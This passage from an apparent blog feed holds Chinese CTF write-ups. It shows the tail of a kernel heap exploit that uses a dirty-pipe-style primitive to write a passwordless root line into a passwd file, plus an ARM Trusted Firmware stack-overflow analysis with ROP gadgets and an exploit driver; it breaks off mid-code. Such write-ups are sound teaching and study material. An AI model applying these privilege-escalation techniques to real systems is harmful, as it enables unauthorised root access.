fake_buffer-&gt;ops);<br><br>    <span class="hljs-type">uint16_t</span> fake_cnt = *(<span class="hljs-type">uint16_t</span> *)&amp;buffer[<span class="hljs-number">0x28</span> + <span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">uint16_t</span> i = fake_cnt - <span class="hljs-number">1</span>; i &lt; (<span class="hljs-type">uint16_t</span>)<span class="hljs-number">0xffff</span>; i++) &#123;<br>        use_chunk(<span class="hljs-number">0</span>, pipe_id, &amp;buffer[<span class="hljs-number">4</span>]);<br>    &#125;<br><br>    delete_chunk(<span class="hljs-number">0</span>, pipe_id);<br>    fake_buffer-&gt;flags = <span class="hljs-number">0x10</span>;<br>    fake_buffer-&gt;len = <span class="hljs-number">0</span>;<br>    create_chunk(<span class="hljs-number">0</span>, pipe_id, &amp;buffer[<span class="hljs-number">4</span>]);<br><br>    <span class="hljs-type">char</span> *root_passwd = <span class="hljs-string">&quot;root::0:0:root:/root:/bin/sh \n&quot;</span>;<br><br>    write(pipe_fd[<span class="hljs-number">1</span>], root_passwd, <span class="hljs-built_in">strlen</span>(root_passwd));<br><br>    close(dev_fd);<br>    close(pipe_fd[<span class="hljs-number">0</span>]);<br>    close(pipe_fd[<span class="hljs-number">1</span>]);<br>    close(target_fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/08/16/jqctf2024-badlist/getroot.png" class title="getroot"><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>官方做法</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ul><li>用link功能（其实是insert ( •̀ ω •́ ) ）复制几份info</li><li>double free后分配给pipe_buffer和msg_msg</li><li>利用msg_msg造dirty pipe</li></ul><p><em>优雅的堆喷~</em></p><img src="/2024/08/16/jqctf2024-badlist/flag1.png" class title="flag1"><img src="/2024/08/16/jqctf2024-badlist/flag2.png" class title="flag2">]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 京麒CTF babytf wp</title>
    <link href="/2024/08/10/jqctf2024-babytf/"/>
    <url>/2024/08/10/jqctf2024-babytf/</url>
    
    <content type="html"><![CDATA[<p>虚拟机clone寄了所以主机clone然后打包到虚拟机里导致符号链接全没了编译一直寄，评价为：顶尖人干顶尖事：）</p><span id="more"></span><h1 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h1><ul><li><p>注册了一个smc服务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">DECLARE_RT_SVC(<br>MY_SVC,<br>OEN_OEM_START,<br>OEN_OEM_END,<br>SMC_TYPE_FAST,<br>my_own_svc_setup,<br>my_smc_handler<br>);<br></code></pre></td></tr></table></figure><p>handler，vuln中存在栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">my_smc_handler</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> smc_fid,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> x1,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> x2,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> x3,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> x4,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> *cookie,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> *handle,</span><br><span class="hljs-params">   <span class="hljs-type">u_register_t</span> flags)</span>&#123;<br><br>    ERROR(<span class="hljs-string">&quot;vuln_handler: SMC Call: 0x%x\n&quot;</span>, smc_fid);<br>    <span class="hljs-keyword">if</span> (smc_fid != <span class="hljs-number">0xc3000000</span>)<br>        SMC_RET1(handle, SMC_UNK);<br>    vuln((<span class="hljs-type">void</span> *)x1, (<span class="hljs-type">size_t</span>)x2);<br>    SMC_RET1(handle, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">(<span class="hljs-type">void</span> *x1, <span class="hljs-type">size_t</span> x2)</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x100</span>];<br>    ERROR(<span class="hljs-string">&quot;vuln\n&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf,(<span class="hljs-type">void</span> *)x1, x2);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>读flag的函数，但要控制x0&#x3D;&#x3D;flag，需要ROP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br>    <span class="hljs-keyword">if</span>(addr != (<span class="hljs-type">size_t</span>)flag)&#123;<br>        tf_log(<span class="hljs-string">&quot;\x0aget flag failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">asm</span>(<br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_0\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_1\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#4]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_2\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#8]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_3\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0xC]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_4\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0x10]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_5\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0x14]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_6\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0x18]\n&quot;</span><br>        <span class="hljs-string">&quot;MRS             X1, S3_3_C15_C12_7\n&quot;</span><br>        <span class="hljs-string">&quot;STR             W1, [X0,#0x1C]\n&quot;</span><br>    );<br>    <span class="hljs-keyword">if</span>(addr == (<span class="hljs-type">size_t</span>)flag)&#123;<br>        tf_log(<span class="hljs-string">&quot;\x0aget flag success!\n&quot;</span>);<br>        tf_log(<span class="hljs-string">&quot;\x0a%s\n&quot;</span>,flag);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>由于smc指令必须在内核态执行，有root权限，可以写一个驱动执行smc指令，根据这行代码↓判断fid为0xc3000000</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (smc_fid != <span class="hljs-number">0xc3000000</span>)<br>    SMC_RET1(handle, SMC_UNK);<br></code></pre></td></tr></table></figure><p>或者可以根据这张表和注册服务的代码判断</p><img src="/2024/08/10/jqctf2024-babytf/service.webp" class title="service"></li></ul><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>为了让环境尽可能一致，拉了个22.04的ubuntu的docker编的</p><p>编出来驱动还是挂不上，version magic对不上，<em>尝试过直接patch，然后就变成了这样</em></p><img src="/2024/08/10/jqctf2024-babytf/vermagic.png" class title="vermagic"><p><em><strong>人无语到一定程度真的会笑~~~&#x2F;&#x2F;&#x2F;(^v^)\\\~~~</strong></em></p><p>最后改了Makefile成了</p><img src="/2024/08/10/jqctf2024-babytf/makefile.png" class title="makefile"><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li><p>vuln是从物理地址进行memcpy，给了一个buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ERROR(<span class="hljs-string">&quot;Your share buffer is at 0x%x, size 0x2000\n&quot;</span>, <span class="hljs-number">0x423DF000</span>);<br></code></pre></td></tr></table></figure><p>可以用驱动的mmap把物理地址映射到用户空间</p></li><li><p>用这两条指令进行ROP控制x0，再执行getflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x000000000e0a01d4: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;<br>0x000000000e0a1e6c: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;<br></code></pre></td></tr></table></figure></li><li><p>直接执行getflag会重复执行getflag，因为ROP链是用x30调用getflag的</p><img src="/2024/08/10/jqctf2024-babytf/error.png" class title="error"><p>可以从getflag的第二条指令开始执行，会直接寄，不会有那么多输出</p><img src="/2024/08/10/jqctf2024-babytf/flag.png" class title="flag"></li><li><p><em>其实可以把所有步骤放在驱动的init里，但这样每次更改都要重编驱动很耗时</em></p></li></ul><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>感谢呆神</p><ul><li><p>my_exploit_driver.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/***************************************************************************/</span><span class="hljs-comment">/**</span><br><span class="hljs-comment">*  \file       driver.c</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  \details    Simple Linux device driver (IOCTL)</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  \author     EmbeTronicX</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  \Tested with Linux raspberrypi 5.10.27-v7l-embetronicx-custom+</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*******************************************************************************/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kdev_t.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/cdev.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/device.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/slab.h&gt;</span>                 <span class="hljs-comment">//kmalloc()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;linux/uaccess.h&gt;</span>              <span class="hljs-comment">//copy_to/from_user()</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/page.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/pgtable.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/arm-smccc.h&gt;</span></span><br> <br><span class="hljs-type">dev_t</span> dev = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-keyword">class</span> *<span class="hljs-title">dev_class</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cdev</span> <span class="hljs-title">etx_cdev</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** Function Prototypes</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      __init <span class="hljs-title function_">etx_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span>     __exit <span class="hljs-title function_">etx_driver_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      <span class="hljs-title function_">etx_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      <span class="hljs-title function_">etx_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span>  <span class="hljs-title function_">etx_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> len,<span class="hljs-type">loff_t</span> * off)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span>  <span class="hljs-title function_">etx_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> * off)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span>     <span class="hljs-title function_">etx_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      <span class="hljs-title function_">etx_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** File operation sturcture</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fops</span> =</span><br>&#123;<br>        .owner          = THIS_MODULE,<br>        .read           = etx_read,<br>        .write          = etx_write,<br>        .open           = etx_open,<br>        .mmap           = etx_mmap,<br>        .unlocked_ioctl = etx_ioctl,<br>        .release        = etx_release,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> smc_fid;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x1;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x3;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> x4;<br>&#125; SmcArgs;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">size_t</span> addr;  <span class="hljs-comment">// 用于存储物理地址</span><br>    <span class="hljs-type">size_t</span> size;       <span class="hljs-comment">// 用于存储读取的大小</span><br>    <span class="hljs-type">size_t</span> recv_addr;<br>&#125;Arb_read_arg;<br><br>SmcArgs smcArg;<br>Arb_read_arg arb_read_arg;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-title function_">smc_call</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> smc_fid, </span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> arg1, </span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> arg2, </span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> arg3,</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> arg4,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> arm_smccc_res *res</span><br><span class="hljs-params">    )</span>&#123;<br>    arm_smccc_smc(smc_fid, arg1, arg2, arg3, arg4, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, res);<br>    <span class="hljs-keyword">return</span> res-&gt;a0;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">etx_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> offset = vma-&gt;vm_pgoff;<br><br>    <span class="hljs-keyword">if</span> (offset &gt;= __pa(high_memory) || (filp-&gt;f_flags &amp; O_SYNC))<br>        vm_flags_set(vma, vma-&gt;vm_flags | VM_IO);<br>    vm_flags_set(vma, vma-&gt;vm_flags | (VM_DONTEXPAND | VM_DONTDUMP));<br><br>    <span class="hljs-keyword">if</span> (io_remap_pfn_range(vma, vma-&gt;vm_start, offset, <br>        vma-&gt;vm_end-vma-&gt;vm_start, vma-&gt;vm_page_prot))<br>        <span class="hljs-keyword">return</span> -EAGAIN;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we open the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">etx_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>        pr_info(<span class="hljs-string">&quot;Device File Opened...!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we close the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">etx_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>        pr_info(<span class="hljs-string">&quot;Device File Closed...!!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we read the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">etx_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *off)</span><br>&#123;<br>        pr_info(<span class="hljs-string">&quot;Read Function\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we write the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">etx_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *off)</span><br>&#123;<br>        pr_info(<span class="hljs-string">&quot;Write function\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> len;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** This function will be called when we write IOCTL on the Device file</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">etx_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>         <span class="hljs-keyword">switch</span>(cmd) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0x13370001</span>:<br>                        <span class="hljs-keyword">if</span>( copy_from_user(&amp;smcArg ,(SmcArgs*) arg, <span class="hljs-keyword">sizeof</span>(SmcArgs)) )<br>                        &#123;<br>                                pr_err(<span class="hljs-string">&quot;smc arg : Err!\n&quot;</span>);<br>                                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>                        &#125;<br>                        <span class="hljs-type">int</span> ret = smc_call(smcArg.smc_fid, smcArg.x1, smcArg.x2, smcArg.x3, smcArg.x4, (<span class="hljs-keyword">struct</span> arm_smccc_res *)&amp;smcArg);<br>                        pr_info(<span class="hljs-string">&quot;smc ret: 0x%llx\n&quot;</span>, ret);<br>                        copy_to_user((SmcArgs*) arg, &amp;smcArg, <span class="hljs-keyword">sizeof</span>(SmcArgs));<br>                        <span class="hljs-keyword">return</span> ret;<br>                        <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0x13370002</span>:<br>                        <span class="hljs-keyword">if</span>( copy_from_user(&amp;arb_read_arg ,(Arb_read_arg*) arg, <span class="hljs-keyword">sizeof</span>(Arb_read_arg)) )<br>                        &#123;<br>                                pr_err(<span class="hljs-string">&quot;smc arg : Err!\n&quot;</span>);<br>                                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>                        &#125;<br><br>                        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* ptr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)arb_read_arg.addr;<br>                        